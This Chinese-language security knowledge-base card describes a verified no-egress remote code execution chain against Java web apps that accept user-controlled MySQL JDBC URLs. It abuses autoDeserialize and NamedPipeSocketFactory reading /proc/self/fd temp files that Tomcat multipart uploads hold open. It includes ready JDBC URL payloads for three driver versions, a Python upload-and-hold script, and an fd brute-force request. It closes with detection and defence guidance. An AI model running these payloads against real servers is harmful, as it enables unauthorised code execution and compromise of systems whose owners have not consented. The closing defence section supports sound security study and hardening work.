---
id: web-java-deserialization-mysql-jdbc-namedpipe-proc-fd-no-egress
title: MySQL JDBC 不出网利用：NamedPipeSocketFactory 读 /proc/self/fd 上传的临时文件触发反序列化
type: scenario
domain: web
path: web/java/deserialization
technique: mysql-jdbc-namedpipe-proc-fd-no-egress
tags:
- java
- jdbc
- mysql
- deserialization
- named-pipe
- proc-fd
- tempfile
- tomcat
- no-egress
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V68
  verified_at: '2026-11-05T12:01:39+08:00'
  notes: 已对照原文与8张图核对：图01/02 Java-chain FakeMySQLBuildPipeFile→JavaNativeSerialization→EventListenerListToString→JacksonToString→TWrap→TemplatesImpl→BytecodeConvert→Exec（命令firefox）；图03/07 upload_hold.py 上传 3747/3758 字节+60000 padding 并保持连接；图04/05 Tomcat 临时目录 upload_*.tmp 与 /proc/427906/fd/26 指向该文件；图06 先验证 namedPipePath 指向已知 firefox.txt；图08 Web Fuzzer 枚举 /proc/self/fd/{{int(1-100)}}，原文称 fd=29 命中。卡内 MySQL 5/6/8 三套 payload、Tomcat multipart fd 保持、/proc/self/fd 枚举与不出网原理均与原文一致。未验证点：图08 未直接显示 firefox 窗口，命令执行以原文文字为准；PoC 未在本机复跑；原文仅给测试版本 8.0.19 与 5/6/8 payload，未给受影响区间，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/java/deserialization/web-java-deserialization-mysql-jdbc-namedpipe-proc-fd-no-egress/
draft: false
kb_aliases:
- MySQL JDBC 不出网利用
- NamedPipeSocketFactory /proc/self/fd
- namedPipePath 临时文件
- FakeMySQL PipeFile
- JDBC 本地文件反序列化
- multipart 临时文件喂 JDBC
---

## 一句话结论

当应用把用户可控的 JDBC URL 交给 `DriverManager.getConnection()`、而目标又不能出网时，攻击者可用 `autoDeserialize=true` + `ServerStatusDiffInterceptor` + `socketFactory=NamedPipeSocketFactory` + `namedPipePath=/proc/self/fd/N`，让 MySQL 驱动把本进程已打开的临时文件当成"MySQL 服务端响应"读取；该临时文件由 Tomcat multipart 上传写入并保持 fd 打开，内容是攻击者预置的伪 MySQL 协议流（内含序列化 gadget），从而在不连接任何外部 MySQL 服务的情况下完成反序列化 RCE。`N` 未知时爆破 `/proc/self/fd/1..100` 即可命中。

## 原理

- MySQL Connector/J 的 `autoDeserialize=true` 会对服务端返回的某些字段（如 `SHOW SESSION STATUS` 的结果值）执行 Java 反序列化；`ServerStatusDiffInterceptor` 在连接初始化阶段主动执行该查询，给"服务端"返回序列化对象创造了时机。
- 正常出网利用需要一个恶意 MySQL 服务端来返回序列化字节。`NamedPipeSocketFactory` 改变了连接的实现：驱动不再建立 TCP 连接，而是打开 `namedPipePath` 指定的本地路径，把文件内容当作 MySQL 协议报文流解析。因此只要本地存在一个内容可控的文件，就能扮演恶意 MySQL 服务端。
- 该文件不是随便的序列化字节，而是"FakeMySQL PipeFile"：按 MySQL 协议封装好的握手包/结果包，其中字段携带 gadget 的序列化字节。Java-chain 一类工具可直接生成（`FakeMySQLBuildPipeFile` + gadget 链）。原文在无第三方 gadget 依赖的环境中使用 `EventListenerList.toString` 触发 Jackson 反序列化，再用 Spring 动态代理（TWrap）稳定调用 `TemplatesImpl`，最终 `Exec` 执行命令。
- 不出网时难点是"如何把文件放到目标本地且路径已知"。Tomcat/Spring Boot 处理 multipart 时会把 file part 写入 `javax.servlet.context.tempdir` 下的随机文件名临时文件（形如 `work/Tomcat/localhost/ROOT/upload_xxxxxxxx.tmp`）；若请求故意不发送结尾 `--boundary--` 并保持 keep-alive，容器会一直等待后续数据，临时文件及其文件描述符不会被清理。
- Linux 下 `/proc/self/fd/N` 是指向进程第 N 号 fd 的魔术符号链接，打开它等价于打开该 fd 对应的临时文件。于是 `namedPipePath=/proc/self/fd/N` 就能读到攻击者上传的内容，无需知道随机文件名；fd 编号不可预测，但范围通常很小，枚举 1–100 即可。
- 为什么成立：整个链路里"服务端数据"来自目标自己的文件描述符，不产生任何外连流量，出网限制/防火墙失效；同时反序列化入口仍是驱动自身的 `autoDeserialize` 配置，只要 URL 参数可控即可打开。

## 触发条件

- 应用接受用户可控的 JDBC URL（或可拼接进 URL 的参数），并实际调用 `DriverManager.getConnection()`（如数据库连接测试、数据源配置、报表/ETL 连接参数）。
- classpath 存在 MySQL Connector/J，且未禁用 `autoDeserialize`、自定义 `socketFactory`、拦截器参数（原文实测 8.0.19，并给出 5.x/6.x/8.x 三套 payload）。
- 目标为 Linux（依赖 `/proc/self/fd`）。
- 目标存在可接收 multipart 的上传接口，上传内容会落盘为临时文件（Tomcat/Spring Boot 默认 `file-size-threshold=0` 即落盘），且攻击者能保持未完成的 HTTP/1.1 请求。
- 目标 classpath 有可用 gadget（原文使用 JDK 原生 + Jackson + Spring 组合）。
- 上传内容大小不超过容器 `max-file-size` 限制；利用需在临时文件 fd 被释放前完成。

## 利用步骤

1. 确认目标存在"URL 可控 → `DriverManager.getConnection`"的入口（原文为一个接收 JSON `url` 的 `/testconnect` 接口），且返回错误/耗时可用于判断连接是否被驱动处理。
2. 用 Java-chain 等工具生成 FakeMySQL PipeFile：选择与目标 classpath 匹配的 gadget 链（原文为 EventListenerListToString → JacksonToString → TWrap → TemplatesImpl → Exec），填入要执行的命令。
3. 通过 multipart 上传该 payload 文件，故意扣留结尾 `--boundary--` 并保持 `Connection: keep-alive`，使 Tomcat 临时文件及其 fd 一直存在（原文 `upload_hold.py`，上传 firefox 并加 60000 字节 padding）。
4. 在另一个连接上向 JDBC 入口发送 URL，`namedPipePath` 依次填 `/proc/self/fd/1` 到 `/proc/self/fd/100`，`autoDeserialize=true`、拦截器与 `socketFactory` 按驱动版本填写。
5. 命中某个 fd 时驱动读到完整伪协议流并反序列化，命令执行（原文 fd=29 命中并弹出 firefox）。
6. 若未命中，调整 fd 范围或重新上传刷新 fd；利用完成后关闭上传连接会释放临时文件。

## PoC

各版本 JDBC URL（原文）：

```text
// mysql5
jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.jdbc.NamedPipeSocketFactory&namedPipePath=/proc/self/fd/N

// mysql6
jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath=/proc/self/fd/N

// mysql8
jdbc:mysql://xxx/test?&maxAllowedPacket=74996390&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory&namedPipePath=/proc/self/fd/N
```

上传并保持 fd 打开（原文脚本核心逻辑，Python3）：

```python
import socket, time
bnd = "----XuanBoundary"
data = open("payload.bin", "rb").read()
PAD = 60000
head = (f"--{bnd}\r\n"
        'Content-Disposition: form-data; name="file"; filename="x.bin"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n").encode()
tail = f"\r\n--{bnd}--\r\n".encode()
clen = len(head) + len(data) + PAD + len(tail)
req = (f"POST /upload HTTP/1.1\r\nHost: TARGET:9999\r\n"
       f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
       f"Content-Length: {clen}\r\nConnection: keep-alive\r\n\r\n").encode()
s = socket.create_connection(("TARGET", 9999), timeout=30)
s.sendall(req + head + data + b"\x00" * PAD)   # 故意不发送结尾 boundary
time.sleep(60)                                  # 保持连接，fd 不释放
```

随后向 JDBC 入口发送（原文 8.x 请求体）：

```http
POST /testconnect HTTP/1.1
Content-Type: application/json
Host: TARGET

{"url": "jdbc:mysql://127.0.0.1:3306/test?useSSL=false&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory&namedPipePath=/proc/self/fd/{{int(1-100)}}&maxAllowedPacket=74996390&user=mysql&dbname=test"}
```

说明：`{{int(1-100)}}` 为爆破占位；原文用 Web Fuzzer 并发枚举，fd=29 命中。payload 文件由 Java-chain 生成，非本机执行。

## 变体与关联

- 变体：有出网时不需要本地文件，直接连接恶意 MySQL 服务端返回序列化对象，见 [[web-java-deserialization-mysql-jdbc-url-autodeserialize-rce]]；Fastjson 等反序列化入口触发同一驱动特性见 [[web-java-deser-fastjson-mysql-jdbc-autodeserialize]]。
- 变体：临时文件 fd 原语本身可配合任意"按路径读取/加载本地文件"的 sink（fastjson `jar:file:`、任意文件读取、类加载器），见 [[web-java-component-tomcat-multipart-tempfile-fd]]。
- 变体：Windows 下 `NamedPipeSocketFactory` 指向真实命名管道（如 `\\.\pipe\...`），不存在 `/proc/self/fd` 枚举路径，需要其他本地写入方式。
- 变体：fd 编号随并发连接/容器实现变化，可扩大枚举范围或用多个并发上传增加命中概率；上传内容需落在 `max-file-size` 内。
- 边界：应用对 JDBC URL 参数做白名单、驱动关闭 `autoDeserialize`/禁止自定义 socketFactory、目标非 Tomcat 或上传不落盘、classpath 无 gadget、非 Linux 时，该链不成立。

## 检测与防御

- 检测：JDBC 连接串中出现 `autoDeserialize`、`socketFactory`、`namedPipePath`、`ServerStatusDiffInterceptor`、`/proc/self/fd`；连接目标为 `127.0.0.1`/任意 host 但实际无外部 3306 流量。
- 检测：应用进程访问 `/proc/self/fd/*`（auditd/EDR/RASP）；Tomcat 工作目录出现长时间不清理的 `upload_*.tmp`；同一来源同时存在未完成 multipart 请求与 JDBC 测试请求。
- 防御：不要接受用户可控的 JDBC URL；连接参数白名单，禁止 `autoDeserialize`、自定义 `socketFactory`、拦截器等属性；升级 MySQL Connector/J 到默认关闭不安全行为的版本。
- 防御：限制 multipart 大小与请求超时、及时清理临时文件；对本地文件读取 sink 做路径白名单（禁止 `/proc`）；容器以最小权限运行。
- 注意：仅靠出网限制无法阻断本链，因为数据来自目标自身文件描述符；必须同时收紧 JDBC 参数与上传/本地读取面。
